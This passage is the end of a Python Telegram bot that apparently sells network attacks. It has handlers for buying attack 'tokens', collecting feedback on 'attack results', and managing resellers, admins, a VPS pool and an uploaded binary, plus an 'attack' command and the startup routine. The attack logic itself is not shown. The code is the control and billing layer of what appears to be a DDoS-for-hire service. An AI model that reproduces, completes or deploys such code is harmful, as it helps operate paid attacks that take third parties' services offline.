    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /buytokens [AMOUNT]")
        return

    amount = int(args[0])
    user_response = f"🛒 **Token Request Sent:** `{amount}` tokens\nPlease wait for approval from @MrRanDom8!\n💻 Bot by @MrRanDom8"
    owner_notification = (
        f"🔔 **New Token Request**\n"
        f"👤 User: @{username} (ID: `{user_id}`)\n"
        f"💰 Amount: `{amount}` tokens\n"
        f"📅 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"💻 Bot by @MrRanDom8"
    )

    await update.message.reply_text(user_response)
    await context.bot.send_message(chat_id=OWNER_ID, text=owner_notification)

# Feedback Handler
async def feedback_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle feedback from attack results."""
    query = update.callback_query  # ✅ Fix: Define query
    try:
        task_id, feedback = query.data.split("_")[1:]
        await asyncio.to_thread(db.feedback.insert_one, {"task_id": task_id, "feedback": feedback})
        await query.answer("🌟 **Thanks for your feedback!**")
        await query.edit_message_text(f"✅ Feedback received: `{feedback}` for Task `{task_id}`")
    except Exception as e:
        await query.answer("❌ **Error processing feedback!**")
        print(f"Feedback Error: {e}")  # Debugging

# Register Handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help))
app.add_handler(CommandHandler("addtokens", add_tokens))
app.add_handler(CommandHandler("ban", ban_user))
app.add_handler(CommandHandler("unban", unban_user))
app.add_handler(CommandHandler("addreseller", add_reseller))
app.add_handler(CommandHandler("removereseller", remove_reseller))
app.add_handler(CommandHandler("setadmin", set_admin))
app.add_handler(CommandHandler("removeadmin", remove_admin))
app.add_handler(CommandHandler("listusers", list_users))
app.add_handler(CommandHandler("add_vps", add_vps))
app.add_handler(CommandHandler("rem_vps", rem_vps))
app.add_handler(CommandHandler("list_vps", list_vps))
app.add_handler(CommandHandler("upload_binary", upload_binary))
app.add_handler(CommandHandler("setup", setup))
app.add_handler(CommandHandler("vps", vps))  # New command to set default VPS count
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("checktokens", check_tokens))
app.add_handler(CommandHandler("buytokens", buy_tokens))
app.add_handler(CommandHandler("check_lock", check_lock))
app.add_handler(CommandHandler("release_lock", release_lock))
app.add_handler(CommandHandler("removetoken", remove_tokens))
app.add_handler(CallbackQueryHandler(feedback_callback, pattern=r"feedback_(\w+)_(\w+)"))

# Main Function to Start the Bot
async def main():
    """Main function to start the bot and perform initial setup."""
    logger.info("🚀 Bot is starting...")
    # Initialize the VPS pool
    await initialize_vps_pool()
    # Start the bot
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    # Keep the bot running
    await asyncio.Event().wait()

# Start the Bot
if __name__ == "__main__":
    asyncio.run(main())
